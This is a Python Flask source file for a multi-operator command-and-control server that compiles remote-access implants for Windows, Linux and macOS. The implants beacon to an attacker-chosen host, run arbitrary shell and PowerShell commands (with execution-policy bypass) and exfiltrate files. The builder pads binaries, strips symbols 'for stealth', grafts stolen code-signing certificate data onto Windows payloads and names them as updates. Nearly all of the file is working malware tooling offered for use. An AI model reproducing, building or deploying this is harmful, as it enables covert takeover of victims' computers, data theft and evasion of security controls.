from flask import Flask, render_template, request, send_file, jsonify, session, redirect, url_for
import base64, io, os, uuid, struct, subprocess, datetime, json, pefile, sys, sqlite3

app = Flask(__name__)
# --- Configuración y Arquitectura de Base de Datos Multi-Operador (Nuevo) ---
DB_FILE = "zentryx_c2.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    # Tabla principal de Tareas y Correlación de Operadores
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tasks (
            task_id TEXT PRIMARY KEY,
            agent_id TEXT NOT NULL,
            operator_id TEXT NOT NULL,
            command TEXT NOT NULL,
            output TEXT DEFAULT '',
            status TEXT DEFAULT 'PENDING',
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

# Inicializamos la persistencia antes de recibir conexiones
init_db()
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',
    SESSION_COOKIE_HTTPONLY=True,
    PERMANENT_SESSION_LIFETIME=datetime.timedelta(days=1)
)
app.secret_key = os.urandom(24) # Clave para cifrar las cookies de sesión
agents = {}

# --- Configuración del Banner ---
BANNER = r"""
   _____ ____  _____   ______ ______ ______ ____ 
  / ___// __ \|__  /  / ____//_  __// ____// __ \
  \__ \/ /_/ / /_ <  / /      / /  / __/  / /_/ /
 ___/ / ____/___/ / / /___   / /  / /___ / _, _/ 
/____/_/    /____/  \____/  /_/  /_____//_/ |_|  
                                                  
      >> Shadow Command & Control System <<
"""

# --- Funciones de Backend (Tu lógica original de pefile y mcs) ---

def hijack_and_fix_pe(template_bytes, target_path):
    temp_tpl = f"tpl_{uuid.uuid4().hex}.exe"
    try:
        with open(temp_tpl, "wb") as f: f.write(template_bytes)
        pe_template = pefile.PE(temp_tpl)
        sec_dir = pe_template.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']]
        address, size = sec_dir.VirtualAddress, sec_dir.Size
        if address == 0 or size == 0:
            pe_template.close()
            return False
        with open(temp_tpl, "rb") as f:
            f.seek(address)
            cert_data = f.read(size)
        pe_template.close()
        with open(target_path, "rb") as f: target_data = bytearray(f.read())
        padding = (8 - (len(target_data) % 8)) % 8
        target_data.extend(b'\x00' * padding)
        new_cert_address = len(target_data)
        target_data.extend(cert_data)
        with open(target_path, "wb") as f: f.write(target_data)
        pe_target = pefile.PE(target_path)
        pe_target.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress = new_cert_address
        pe_target.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].Size = size
        pe_target.OPTIONAL_HEADER.CheckSum = pe_target.generate_checksum()
        pe_target.write(target_path)
        pe_target.close()
        return True
    except: return False
    finally:
        if os.path.exists(temp_tpl): os.remove(temp_tpl)

# --- Lógica de Generación Actualizada con Soporte de Latidos Dinámicos ---
def build_apt_exe(lhost, lport, v_interval, v_inflation, template_file=None):
    temp_id = uuid.uuid4().hex[:6]
    cs_file, exe_file = f"core_{temp_id}.cs", f"bin_{temp_id}.exe"
    
    try:
        delay_ms = int(v_interval) * 1000
    except:
        delay_ms = 5000

    try:
        inflation_bytes = int(v_inflation) * 1024 * 1024
    except:
        inflation_bytes = 50 * 1024 * 1024

    cs_source = f'''
    using System;
    using System.IO;
    using System.Diagnostics;
    using System.Net.Http;
    using System.Threading.Tasks;
    using System.Text;
    using System.Text.RegularExpressions;
    
    class Program {{
        static string aid = "win_" + Math.Abs((Environment.MachineName + Environment.UserName).GetHashCode()).ToString("X");
        static string url = "http://{lhost}:{lport}/api/v1/beacon";
        static string lastOut = "";
        static string curDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

        static void Main() {{ try {{ Task.Run(() => RunBeacon()).Wait(); }} catch {{ }} }}

        static async Task RunBeacon() {{
            HttpClient client = new HttpClient();
            while(true) {{
                try {{
                    string json = "{{\\"id\\":\\"" + aid + "\\", \\"hostname\\":\\"" + Environment.MachineName + "\\"";
                    if (!string.IsNullOrEmpty(lastOut)) {{ 
                        json += ", \\"output\\":\\"" + lastOut + "\\""; 
                        lastOut = ""; 
                    }}
                    json += "}}";
                    
                    var res = await client.PostAsync(url, new StringContent(json, Encoding.UTF8, "application/json"));
                    var resData = await res.Content.ReadAsStringAsync();
                    
                    if (resData.Contains("||")) {{
                        string[] parts = resData.Split(new string[] {{ "||" }}, 2, StringSplitOptions.None);
                        string cmd = parts[1];
                        if (cmd != "noop") {{
                            if (cmd.ToLower().StartsWith("download ")) 
                                lastOut = ExecuteDownload(cmd.Substring(9).Trim());
                            else 
                                lastOut = Execute(cmd);
                        }}
                    }}
                }} catch {{ }}
                await Task.Delay({delay_ms});
            }}
        }}

        static string Execute(string cmd) {{
            try {{
                Process p = new Process();
                p.StartInfo.FileName = "powershell.exe";
                
                if (string.IsNullOrEmpty(curDir) || !Directory.Exists(curDir)) {{
                    curDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                }}
                
                p.StartInfo.WorkingDirectory = curDir;
                
                // CORRECCIÓN: Usamos echo estándar en PowerShell con comillas simples, evitando fallas de métodos estáticos y aislando el canal
                string wrap = "$ErrorActionPreference='SilentlyContinue'; try {{ " + cmd + " }} catch {{}}; echo '---PATH---'; (Get-Location).Path; echo '---ENDPATH---'";
                p.StartInfo.Arguments = "-NoP -Exec Bypass -Command \\"" + wrap.Replace("\\"", "\\\\\\\"") + "\\"";
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                
                string r = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                
                // EXTRACCIÓN QUIRÚRGICA: Regex atrapa exactamente lo que esté en medio de ambos marcadores sin importar errores de buffer
                Match match = Regex.Match(r, @"---PATH---([\\s\\S]*?)---ENDPATH---");
                if (match.Success) {{
                    string checkPath = match.Groups[1].Value.Trim();
                    
                    // BLINDAJE: Solo si la ruta existe físicamente en el disco, actualizamos la consola
                    if (!string.IsNullOrEmpty(checkPath) && Directory.Exists(checkPath)) {{
                        curDir = checkPath;
                        
                        // Cortamos el output limpio del comando antes del marcador para que no ensucie la pantalla
                        string cleanOutput = r.Substring(0, r.IndexOf("---PATH---")).Trim();
                        // Retornamos el formato exacto que tu app.js ya conoce perfectamente por defecto
                        return Convert.ToBase64String(Encoding.UTF8.GetBytes(cleanOutput + "---PATH---" + curDir));
                    }}
                }}
                
                return Convert.ToBase64String(Encoding.UTF8.GetBytes(r));
            }} catch (Exception e) {{
                return Convert.ToBase64String(Encoding.UTF8.GetBytes(e.Message));
            }}
        }}
        
        static string ExecuteDownload(string p) {{
            try {{
                string fP = Path.IsPathRooted(p) ? p : Path.Combine(curDir, p);
                return "DOWNLOAD_DATA:" + Path.GetFileName(fP) + ":" + Convert.ToBase64String(File.ReadAllBytes(fP));
            }} catch {{ return ""; }}
        }}
    }}'''

    try:
        with open(cs_file, "w", encoding="utf-8") as f: 
            f.write(cs_source)
        
        subprocess.run(["mcs", "-out:" + exe_file, "-target:winexe", cs_file, "-r:System.Net.Http.dll"], capture_output=True)
        
        if inflation_bytes > 0:
            with open(exe_file, "ab") as f: 
                f.write(os.urandom(inflation_bytes))
            
        if template_file:
            hijack_and_fix_pe(template_file.read(), exe_file)
            
        with open(exe_file, "rb") as f: 
            data = f.read()
        return data
    finally:
        if os.path.exists(cs_file): os.remove(cs_file)
        if os.path.exists(exe_file): os.remove(exe_file)

# --- Generador y Compilador Cruzado Nativo en Go para Linux (.ELF) ---
def build_linux_native_elf(lhost, lport, v_interval, v_inflation):
    temp_id = "lnx_" + uuid.uuid4().hex[:6]
    go_file, bin_file = f"core_{temp_id}.go", f"bin_{temp_id}.elf"
    
    try:
        delay_sec = int(v_interval)
    except:
        delay_sec = 5

    try:
        inflation_bytes = int(v_inflation) * 1024 * 1024
    except:
        inflation_bytes = 50 * 1024 * 1024

    # Código fuente nativo en Go adaptado para Linux
    # Código fuente nativo en Go adaptado con extracción automática de Kernel
    go_source = f'''package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

var aid = "{temp_id}"
var url = "http://{lhost}:{lport}/api/v1/beacon"
var lastOut = ""
var curDir = os.Getenv("HOME")

type BeaconPayload struct {{
	ID       string `json:"id"`
	Hostname string `json:"hostname"`
	Output   string `json:"output,omitempty"`
	OS       string `json:"os,omitempty"` // Nuevo campo dinámico para reportar el Kernel real
}}

func main() {{
	if curDir == "" {{
		curDir = "/tmp"
	}}
	for {{
		runBeacon()
		time.Sleep({delay_sec} * time.Second)
	}}
}}

func runBeacon() {{
	hostname, _ := os.Hostname()
	
	kernelVersion := "Linux"
	if data, err := os.ReadFile("/proc/sys/kernel/osrelease"); err == nil {{
		kernelVersion = "Linux " + strings.TrimSpace(string(data))
	}}

	payload := BeaconPayload{{
		ID:       aid,
		Hostname: hostname,
		OS:       kernelVersion,
	}}
	if lastOut != "" {{
		payload.Output = lastOut
		lastOut = ""
	}}

	jsonData, err := json.Marshal(payload)
	if err != nil {{
		return
	}}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {{
		return
	}}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {{
		return
	}}

	resData := string(body)
	if strings.Contains(resData, "||") {{
		parts := strings.SplitN(resData, "||", 2)
		if len(parts) == 2 {{
			cmd := strings.TrimSpace(parts[1]) // Aseguramos extraer el comando de la tubería
			if cmd != "noop" {{
				// CORRECCIÓN: Interceptamos si el comando inicia con la palabra clave download
				if strings.HasPrefix(strings.ToLower(cmd), "download ") {{
					filePath := strings.TrimSpace(cmd[9:])
					lastOut = executeLinuxDownload(filePath)
				}} else {{
					lastOut = executeLinuxCommand(cmd)
				}}
			}}
		}}
	}}
}}

func executeLinuxCommand(cmd string) string {{
	wrap := fmt.Sprintf("cd \\"%s\\"; %s; echo '---PATH---'; pwd", curDir, cmd)
	c := exec.Command("/bin/bash", "-c", wrap)
	
	var out bytes.Buffer
	c.Stdout = &out
	c.Stderr = &out
	_ = c.Run()

	r := out.String()
	if strings.Contains(r, "---PATH---") {{
		pts := strings.Split(r, "---PATH---")
		if len(pts) == 2 {{
			curDir = strings.TrimSpace(pts[1])
			outputClean := strings.TrimSpace(pts[0])
			return base64.StdEncoding.EncodeToString([]byte(outputClean + "---PATH---" + curDir))
		}}
	}}
	return base64.StdEncoding.EncodeToString([]byte(r))
}}

// Nueva función complementaria nativa en Go para transferir archivos al C2
func executeLinuxDownload(p string) string {{
	// Validar si la ruta es absoluta; si es relativa, combinarla con el directorio actual
	finalPath := p
	if !strings.HasPrefix(p, "/") {{
		finalPath = fmt.Sprintf("%s/%s", curDir, p)
	}}

	fileBytes, err := os.ReadFile(finalPath)
	if err != nil {{
		return ""
	}}

	// Extraer únicamente el nombre del archivo para la cabecera
	fileParts := strings.Split(finalPath, "/")
	fileName := fileParts[len(fileParts)-1]

	encodedData := base64.StdEncoding.EncodeToString(fileBytes)
	// Retornamos el string con el formato exacto que tu app.py espera procesar en su endpoint de beacon
	return fmt.Sprintf("DOWNLOAD_DATA:%s:%s", fileName, encodedData)
}}
'''
    try:
        with open(go_file, "w", encoding="utf-8") as f:
            f.write(go_source)
        
        # Invocamos la Compilación Cruzada Nativa desactivando CGO para evitar dependencias
        env = os.environ.copy()
        env["GOOS"] = "linux"
        env["GOARCH"] = "amd64"
        env["CGO_ENABLED"] = "0"
        
        subprocess.run(["go", "build", "-ldflags", "-s -w", "-o", bin_file, go_file], env=env, capture_output=True)
        
        # Aplicamos la inflación de Megabytes configurados desde la interfaz web
        if inflation_bytes > 0 and os.path.exists(bin_file):
            with open(bin_file, "ab") as f:
                f.write(os.urandom(inflation_bytes))
        
        with open(bin_file, "rb") as f:
            data = f.read()
        return data
    finally:
        if os.path.exists(go_file): os.remove(go_file)
        if os.path.exists(bin_file): os.remove(bin_file)


# --- Generador y Compilador Cruzado Nativo en Go para macOS (.MACH-O) ---
def build_mac_native_macho(lhost, lport, v_interval, v_inflation):
    temp_id = "mac_" + uuid.uuid4().hex[:6]
    go_file, bin_file = f"core_{temp_id}.go", f"bin_{temp_id}.macho"
    
    try:
        delay_sec = int(v_interval)
    except:
        delay_sec = 5

    try:
        inflation_bytes = int(v_inflation) * 1024 * 1024
    except:
        inflation_bytes = 50 * 1024 * 1024

    # Código fuente nativo en Go adaptado para macOS (Usa /bin/zsh por defecto)
    go_source = f'''package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

var aid = "{temp_id}"
var url = "http://{lhost}:{lport}/api/v1/beacon"
var lastOut = ""
var curDir = os.Getenv("HOME")

type BeaconPayload struct {{
	ID       string `json:"id"`
	Hostname string `json:"hostname"`
	Output   string `json:"output,omitempty"`
}}

func main() {{
	if curDir == "" {{
		curDir = "/tmp"
	}}
	for {{
		runBeacon()
		time.Sleep({delay_sec} * time.Second)
	}}
}}

func runBeacon() {{
	hostname, _ := os.Hostname()
	payload := BeaconPayload{{
		ID:       aid,
		Hostname: hostname,
	}}
	if lastOut != "" {{
		payload.Output = lastOut
		lastOut = ""
	}}

	jsonData, err := json.Marshal(payload)
	if err != nil {{
		return
	}}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {{
		return
	}}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {{
		return
	}}

	resData := string(body)
	if strings.Contains(resData, "||") {{
		parts := strings.SplitN(resData, "||", 2)
		if len(parts) == 2 {{
			cmd := strings.TrimSpace(parts[1])
			if cmd != "noop" {{
				lastOut = executeMacCommand(cmd)
			}}
		}}
	}}
}}

func executeMacCommand(cmd string) string {{
	// En macOS se prioriza /bin/zsh que es el estándar moderno de Apple
	shellPath := "/bin/zsh"
	if _, err := os.Stat("/bin/zsh"); os.IsNotExist(err) {{
		shellPath = "/bin/sh"
	}}
	
	wrap := fmt.Sprintf("cd \\"%s\\"; %s; echo '---PATH---'; pwd", curDir, cmd)
	c := exec.Command(shellPath, "-c", wrap)
	
	var out bytes.Buffer
	c.Stdout = &out
	c.Stderr = &out
	_ = c.Run()

	r := out.String()
	if strings.Contains(r, "---PATH---") {{
		pts := strings.Split(r, "---PATH---")
		if len(pts) == 2 {{
			curDir = strings.TrimSpace(pts[1])
			outputClean := strings.TrimSpace(pts[0])
			return base64.StdEncoding.EncodeToString([]byte(outputClean + "---PATH---" + curDir))
		}}
	}}
	return base64.StdEncoding.EncodeToString([]byte(r))
}}
'''

    try:
        with open(go_file, "w", encoding="utf-8") as f:
            f.write(go_source)
        
        # Compilación Cruzada Nativa para Apple Silicon M1/M2/M3/M4 (GOOS=darwin GOARCH=arm64)
        env = os.environ.copy()
        env["GOOS"] = "darwin"
        env["GOARCH"] = "arm64" 
        env["CGO_ENABLED"] = "0"
        
        # El flag "-ldflags -s -w" reduce el peso eliminando tablas de símbolos para mayor sigilo
        subprocess.run(["go", "build", "-ldflags", "-s -w", "-o", bin_file, go_file], env=env, capture_output=True)
        
        if inflation_bytes > 0 and os.path.exists(bin_file):
            with open(bin_file, "ab") as f:
                f.write(os.urandom(inflation_bytes))
        
        with open(bin_file, "rb") as f:
            data = f.read()
        return data
    finally:
        if os.path.exists(go_file): os.remove(go_file)
        if os.path.exists(bin_file): os.remove(bin_file)

# --- Rutas de Flask ---

@app.before_request
def check_auth():
    allowed = ['login', 'static', 'beacon', 'logout']
    if 'authenticated' not in session and request.endpoint not in allowed:
        return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('password') == app.config['C2_PASSWORD']:
            session.clear()           # Limpia sesiones viejas
            session['authenticated'] = True
            session.permanent = True  # Mantiene la sesión activa
            return redirect(url_for('index'))
        else:
            return render_template('login.html', error="Invalid Password")
    return render_template('login.html')
    
@app.route('/logout')
def logout():
    session.clear() # Esto "limpia" la cookie de acceso del navegador
    return redirect(url_for('login')) # Te manda de vuelta al login
    
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/generate', methods=['POST'])
def generate():
    target_os = request.form.get('v_os', 'windows')
    lhost = request.form.get('v_host')
    lport = request.form.get('v_port', '5000')
    v_interval = request.form.get('v_interval', '5')
    v_inflation = request.form.get('v_inflation', '50')
    template = request.files.get('template_file')

    print(f"[*] Compiling requested payload: OS={target_os.upper()} | Callback={lhost}:{lport} | Padding={v_inflation}MB")

    if target_os == 'windows':
        # Mantiene tu flujo original e inyección de firmas intactos para Windows
        bin_data = build_apt_exe(lhost, lport, v_interval, v_inflation, template)
        return send_file(io.BytesIO(bin_data), as_attachment=True, download_name="SignedUpdate.exe")
        
    elif target_os == 'linux':
        # Invoca el nuevo motor nativo de Go para generar binarios ELF reales
        bin_data = build_linux_native_elf(lhost, lport, v_interval, v_inflation)
        return send_file(io.BytesIO(bin_data), as_attachment=True, download_name="update.elf")
        
    elif target_os == 'mac':
        # Invoca el nuevo motor nativo de Go para generar binarios Mach-O reales
        bin_data = build_mac_native_macho(lhost, lport, v_interval, v_inflation)
        return send_file(io.BytesIO(bin_data), as_attachment=True, download_name="update.macho")
        
    else:
        return "Platform unsupported", 400

@app.route('/api/v1/beacon', methods=['POST'])
def beacon():
    data = request.json
    if not data: return "shell||noop"
    aid = data.get('id')
    
    if aid not in agents:
        # --- DETECCIÓN DINÁMICA DE PLATAFORMA OPTIMIZADA ---
        detected_os = data.get('os')
        detected_arch = "x64"
        
        if not detected_os:
            detected_os = "Windows 10 Pro"
            if "lnx" in str(aid):
                detected_os = "Linux (Kernel 6.x)"
            elif "mac" in str(aid):
                detected_os = "macOS (Darwin)"
                detected_arch = "ARM64 (Apple Silicon)"
            
        agents[aid] = {
            "ip": request.remote_addr, 
            "hostname": data.get('hostname','...'), 
            "os": detected_os,       
            "arch": detected_arch, 
            "queue": [], 
            "results": [], 
            "files": {}, 
            "new_files": []
        }
    
    agents[aid]["hostname"] = data.get('hostname', agents[aid]["hostname"])
    agents[aid]["last_seen"] = datetime.datetime.now().strftime("%H:%M:%S")
    
    # === MANEJO DE RESPUESTAS E INYECCIÓN EN SQLITE ===
    if "output" in data:
        out = data["output"]
        if out.startswith("DOWNLOAD_DATA:"):
            parts = out.split(":", 2)
            agents[aid]["files"][parts[1]] = parts[2]
            agents[aid]["new_files"].append(parts[1])
        else:
            try:
                decoded_output = base64.b64decode(out).decode('utf-8')
                
                # Buscamos la tarea pendiente más antigua para este agente específico
                conn = sqlite3.connect(DB_FILE)
                cursor = conn.cursor()
                cursor.execute('''
                    SELECT task_id FROM tasks 
                    WHERE agent_id = ? AND status = 'PENDING'
                    ORDER BY timestamp ASC LIMIT 1
                ''', (aid,))
                row = cursor.fetchone()
                
                if row:
                    task_id = row[0]
                    # Asignamos el resultado y completamos la tarea de forma aislada
                    cursor.execute('''
                        UPDATE tasks SET output = ?, status = 'COMPLETED' 
                        WHERE task_id = ?
                    ''', (decoded_output, task_id))
                    conn.commit()
                conn.close()
            except Exception as e:
                print(f"[!] Error saving beacon output to database: {e}")
            
    # === RETRACCION DE INSTRUCCIONES DESDE SQLITE ===
    cmd = "noop"
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        # Extraemos la instrucción PENDING correspondiente en orden de llegada
        cursor.execute('''
            SELECT command FROM tasks 
            WHERE agent_id = ? AND status = 'PENDING'
            ORDER BY timestamp ASC LIMIT 1
        ''', (aid,))
        row = cursor.fetchone()
        if row:
            cmd = row[0]
        conn.close()
    except Exception as e:
        print(f"[!] Error fetching task for beacon: {e}")
        
    return f"shell||{cmd}"

@app.route('/api/v1/operator/list', methods=['GET'])
def list_agents(): return jsonify(agents)

@app.route('/api/v1/operator/push', methods=['POST'])
def push():
    data = request.json
    if not data or 'id' not in data or 'cmd' not in data:
        return jsonify({"status": "error", "message": "Missing parameters"}), 400
        
    aid = data['id']
    cmd = data['cmd']
    
    # Extraemos el identificador de la pestaña u operador (si no viene, asignamos uno genérico)
    operator_id = data.get('operator_id', 'anonymous_operator')
    
    if aid in agents:
        # Generamos un ID único para esta tarea específica (Correlation ID)
        task_id = uuid.uuid4().hex[:8]
        
        # Insertamos el comando en la base de datos como PENDING
        try:
            conn = sqlite3.connect(DB_FILE)
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO tasks (task_id, agent_id, operator_id, command, status)
                VALUES (?, ?, ?, ?, 'PENDING')
            ''', (task_id, aid, operator_id, cmd))
            conn.commit()
            conn.close()
            
            # Mantenemos el aviso en la cola en memoria para que el beacon sepa que hay trabajo
            agents[aid]["queue"].append(cmd)
            return jsonify({"status": "ok", "task_id": task_id})
        except Exception as e:
            print(f"[!] Error inserting task: {e}")
            return jsonify({"status": "error", "message": "Database write failed"}), 500
            
    return jsonify({"status": "error", "message": "Agent offline"}), 404


@app.route('/api/v1/operator/results/<aid>', methods=['GET'])
def get_res(aid):
    # Capturamos quién está preguntando por los resultados desde los parámetros de la URL
    operator_id = request.args.get('operator_id', 'anonymous_operator')
    
    if aid in agents:
        try:
            conn = sqlite3.connect(DB_FILE)
            cursor = conn.cursor()
            
            # Seleccionamos ÚNICAMENTE las tareas completadas que pertenecen a ESTE operador específico
            cursor.execute('''
                SELECT output FROM tasks 
                WHERE agent_id = ? AND operator_id = ? AND status = 'COMPLETED'
                ORDER BY timestamp ASC
            ''', (aid, operator_id))
            
            rows = cursor.fetchall()
            results_list = [row[0] for row in rows]
            
            # Una vez leídos de forma segura por su dueño, limpiamos el estado en la DB para no duplicarlos
            cursor.execute('''
                UPDATE tasks SET status = 'DELIVERED' 
                WHERE agent_id = ? AND operator_id = ? AND status = 'COMPLETED'
            ''', (aid, operator_id))
            
            conn.commit()
            conn.close()
            
            # Mantenemos la lógica de archivos existentes en memoria intacta por el momento
            f = list(agents[aid]["new_files"])
            agents[aid]["new_files"] = []
            
            return jsonify({"results": results_list, "files": f})
        except Exception as e:
            print(f"[!] Error fetching tasks: {e}")
            return jsonify({"results": [], "files": []}), 500
            
    return jsonify({"results": [], "files": []})

@app.route('/api/v1/operator/download_file/<aid>/<fn>', methods=['GET'])
def download_file(aid, fn):
    if aid in agents and fn in agents[aid]["files"]:
        return send_file(io.BytesIO(base64.b64decode(agents[aid]["files"][fn])), as_attachment=True, download_name=fn)
    return "Error", 404

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"\033[1;31m[!] Error: Debes especificar una contraseña.\nUso: python3 app.py <password>\033[0m")
        sys.exit(1)
    
    app.config['C2_PASSWORD'] = sys.argv[1]
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"\033[1;38;5;75m{BANNER}\033[0m")
    print(f"[*] Sp3cter C2 Core: ONLINE")
    print(f"[*] Listen: http://0.0.0\n")
    app.run(host='0.0.0.0', port=5000)

@app.route('/api/v1/operator/notes', methods=['POST'])
def save_notes():
    data = request.json
    # Guardamos las notas en un archivo local en el servidor
    with open("mission_notes.txt", "w", encoding="utf-8") as f:
        f.write(data.get('notes', ''))
    return jsonify({"status": "saved"})

# Lista global simple para alertas (puedes añadir mensajes aquí cuando algo falle)
alerts = []

@app.route('/api/v1/operator/stats')
def get_stats():
    # Simulamos operadores por sesiones activas o simplemente devolvemos 1 si estás logueado
    return jsonify({
        "beacons": len(agents),
        "operators": 1, # Aquí podrías contar sesiones reales si quisieras
        "alerts": len(alerts),
        "status": "OPERATIONAL" if len(agents) > 0 else "IDLE"
    })

